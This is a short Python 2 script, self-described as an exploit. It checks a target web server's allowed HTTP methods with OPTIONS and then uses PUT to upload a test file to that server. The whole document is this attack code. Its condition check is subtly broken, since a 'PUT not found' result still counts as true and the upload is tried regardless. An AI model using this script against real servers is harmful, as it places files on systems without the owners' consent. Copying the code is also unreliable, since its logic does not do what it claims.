#!/usr/bin/python
# -*- coding: utf-8 -*-
# 5crat @ 2014-07-05 18:11:56

import sys
import urllib2

payload = 'hehe'
upload_file = '/test.txt'
host = sys.argv[1]
options = ['OPTIONS','PUT','DELETE','MOVE','GET']
def exploit(op='OPTIONS',path='',data=''):
    operner = urllib2.build_opener(urllib2.HTTPHandler)
    request = urllib2.Request(host+path,data = data)
    request.get_method = lambda:op
    url = operner.open(request)
    return url

result = exploit()
if str(result.info()).find('PUT'):
    result = exploit(options[1],upload_file,payload)
    print 'File Path : ' + host + upload_file
else:
    print 'NO Find'


